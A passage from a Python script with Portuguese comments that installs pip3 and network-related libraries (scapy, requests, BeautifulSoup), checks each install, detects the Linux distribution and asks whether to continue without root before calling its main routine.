    ## INSTALAÇÃO DO PIP3 ##
    ########################
    if not pip_installed:
        input(press)
        print("Pip3 não está instalado. Instalando...")
        os.system('apt-get update')
        os.system('apt-get install -y python3-pip')

    else:
        print("pip3 já está instalado.")

    ###############################
    ## INSTALAÇÃO DE BIBLIOTECAS ##
    ###############################
    packages = {
        'scapy': 'scapy',
        'urllib3': 'urllib3',
        'requests': 'requests',
        'beautifulsoup4': 'bs4',
        'ipaddress': 'ipaddress',
        'tqdm':'tqdm',
        'queue':'queue'
    }

    for package_name, package_module in packages.items():
        try:
            __import__(package_module)
        except ImportError:
            print(f"{package_name} não está instalado. Instalando...")
            os.system(f'pip3 install {package_module}')

    ##########################################################
    ## VERIFICA SE OS PACOTES FORAM INSTALADOS CORRETAMENTE ##
    ##########################################################
    print("Verificando instalação dos pacotes:")
    for package_name, package_module in packages.items():
        try:
            __import__(package_module)
            print(f"    {package_name}: OK")
        except ImportError:
            print(f"    {package_name}: Falha")
    
    ###############
    ## CONCLUSÃO ##
    ###############
    print("Instalação e verificação concluídas.")

    ############################################
    ## IMPORTAÇÃO DE BIBLIOTECAS COMPLEMENTAR ##
    ############################################
    import requests
    import getpass as g
    from tqdm import tqdm
    from queue import Queue
    import http.server as hs
    import socketserver as ss
    from bs4 import BeautifulSoup 
    from requests.exceptions import SSLError
    from urllib.parse import urlparse, urljoin

#-----------------------------------------------------------------------------
####################################
## VERIFICADA A DISTRO DO SISTEMA ##
####################################
with open("/etc/os-release", "r") as arquivo: 
    for linha in arquivo:
        if linha.startswith("ID="):
            distro_id = linha.split("=")[1].strip().strip('"')
        
#-----------------------------------------------------------------------------
###############################
## CASO NÃO ESTEJA COMO ROOT ##
###############################
if os.geteuid() != 0:
    stroot = input("Existem limitações sem ROOT, deseja continuar mesmo assim? (S/N)  ")
    if stroot.lower() == 's':
        main()
    else:
        quit()
else:
    main()

